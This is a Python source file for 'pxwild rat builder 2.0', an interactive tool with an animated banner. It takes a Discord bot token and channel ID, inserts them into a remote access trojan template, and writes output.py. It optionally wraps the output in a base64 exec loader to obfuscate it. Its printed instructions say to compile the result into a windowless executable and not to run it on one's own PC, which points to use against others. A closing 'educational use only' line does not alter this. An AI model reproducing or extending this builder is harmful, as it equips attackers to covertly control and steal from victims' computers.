import sys
import os
import re
import math
import time
import base64
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import ANSI

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.dirname(__file__), relative_path)

banner = r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠦⡄⠀⠀⠀⠀⠀⠀⡴⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
⠀⢀⣀⠀⠀⠀⣀⠤⠖⠒⠋⡉⠙⢲⣺⢅⡀⠀⠹⡀⠀⠀⠀⢀⡜⠁⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⢤⣠⢷⣝⢦⠀⠀⠀⠀
⣼⠉⠀⠉⠓⠏⠁⠀⠀⠀⠀⢯⣧⠈⢿⡆⠈⠓⢴⠇⠀⠀⣠⠊⠀⠀⠀⡀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠒⣲⣦⣺⣳⣤⡿⠛⠃⠀⠀⠀
⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⡀⠄⠠⢀⠈⢣⡀⠀⠁⠀⢀⡤⠊⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠉⠢⣣⣁⠀⣀⠙⢧⠀⠀⠀⠀⠀
⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⠎⠀⠀⠀⠘⡇⠀⢧⠀⠐⠊⠁⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⡎⠑⢤⡼⡩⡪⠷⠀⠀⡇⠀⠀⠀⠀
⠀⢸⠳⣄⠀⠀⠀⠀⠀⠀⠀⠈⢺⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⢀⣀⣀⡀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣶⡞⢯⣠⡻⠼⡇⠀⠀⠀⡇⠀⠀⠀⠀
⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠠⠄⢀⡀⢇⠀⢸⡀⠀⡀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡷⢌⠻⣶⡟⡄⠈⠁⠀⠀⠐⢣⡀⠀⠀⠀
⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠀⠀⠀⠈⠙⠆⡼⠛⢦⡀⠑⠢⣄⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⡴⣷⣿⡗⠀⣡⠊⠻⠋⠒⢄⠀⠀⢀⠔⠙⢦⡀⠀
⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡌⠢⣀⠀⢀⡴⡰⠁⠀⢀⡇⠀⠀⠈⠑⠀ ⠀⠀⠀⠀⠀⠀⡠⠊⠁⢺⣿⢇⠜⠁⠀⠀⠀⠀⣠⠗⠊⠀⠀⣠⡺⠆⠀
⠀⠀⠀⢸⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠗⠒⠚⠉⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⣠⣾⡗⠀⠀⢸⡿⠋⠀⠀⠀⠀⠀⠀⠻⣆⠛⣠⣞⢕⢽⣆⠀
⠀⠀⠀⡜⠀⠉⠢⢄⣀⠀⠀⠀⠀⠀⣀⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⣴⣿⣿⡇⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⢐⡯⡪⡫⡢⣑⣕⢕⠀
⠀⠀⠀⡇⠀⠀⠀⠀⣨⠟⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⣼⣿⣿⣿⠇⡰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢮⡺⣾⣮⡪⡳⠀
⠀⠀⠀⠙⠂⠴⠒⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣼⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠺⣷⣝⢮⠀
                               ⠾⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠪⣻⡇
(pxwild rat builder 2.0)⠀"""

WHITE = (255, 255, 255)
PURPLE = (180, 0, 255)

def gradient_ansi(text, t):
    lines = text.splitlines()
    out_lines = []
    for y, line in enumerate(lines):
        s = ""
        for x, ch in enumerate(line):
            u = (math.sin(t + (x + y*1.5)*0.1) + 1) / 2
            r = int(WHITE[0]*(1-u) + PURPLE[0]*u)
            g = int(WHITE[1]*(1-u) + PURPLE[1]*u)
            b = int(WHITE[2]*(1-u) + PURPLE[2]*u)
            s += f"\x1b[38;2;{r};{g};{b}m{ch}\x1b[0m"
        out_lines.append(s)
    return "\n".join(out_lines)

session = PromptSession()

def prompt_func(prompt_text):
    def inner():
        t = time.time() * 4.0
        banner_colored = gradient_ansi(banner, t)
        enter_colored = gradient_ansi(prompt_text, t + 2)
        return ANSI(f"{banner_colored}\n{enter_colored}")
    return inner

def main():
    if os.name == 'nt':
        os.system('title pxwild rat builder')
    token = session.prompt(prompt_func("Enter your Discord bot token: "), refresh_interval=0.05).strip()
    os.system('cls' if os.name == 'nt' else 'clear')
    time.sleep(0.1)
    channel_id = session.prompt(prompt_func("Enter your Discord channel ID: "), refresh_interval=0.05).strip()
    template_path = resource_path("rat-code.py")
    output_path = "output.py"
    if not os.path.exists(template_path):
        print(f"\n\x1b[38;2;255;0;0m[-] Error: Template file '{template_path}' not found!\x1b[0m")
        input("Press Enter to exit...")
    else:
        with open(template_path, 'r', encoding='utf-8') as f:
            content = f.read()
        content = re.sub(r"'{token}'", f"'{token}'", content)
        content = content.replace("{channel_id}", channel_id)
        
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.1)
        obfuscate_choice = session.prompt(prompt_func("Do you want to obfuscate the script? (y/n): "), refresh_interval=0.05).strip().lower()
        
        green = "\x1b[38;2;0;255;0m"
        reset = "\x1b[0m"
        
        if obfuscate_choice in ['y', 'yes']:
            code = content
            encoded = base64.b64encode(code.encode('utf-8')).decode('utf-8')
            loader = f"""import base64
exec(base64.b64decode('{encoded}'))"""
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(loader)
            print(f"\n{green}[+] " + "="*50 + reset)
            print(f"{green}[+] Successfully created and obfuscated RAT script!{reset}")
            print(f"{green}[+] File: {os.path.abspath(output_path)}{reset}")
            print(f"\n{green}[!] Created obfuscated output.py successfully!{reset}")
            print(f"{green}[!] - do not open the output.py on your own pc!!{reset}")
            print(f"{green}[!] - turn the output.py into a executable with pyinstall{reset}")
            print(f"{green}[!] - python -m PyInstaller --onefile --noconsole output.py{reset}")
        else:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f"\n{green}[+] " + "="*50 + reset)
            print(f"{green}[+] Successfully created RAT script!{reset}")
            print(f"{green}[+] File: {os.path.abspath(output_path)}{reset}")
            print(f"\n{green}[!] Created output.py successfully!{reset}")
            print(f"{green}[!] - turn the output.py into a executable with pyinstall{reset}")
            print(f"{green}[!] - python -m PyInstaller --onefile --noconsole output.py{reset}")
        
        print(f"{green}[!] WARNING: For educational and ethical use only!{reset}")
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()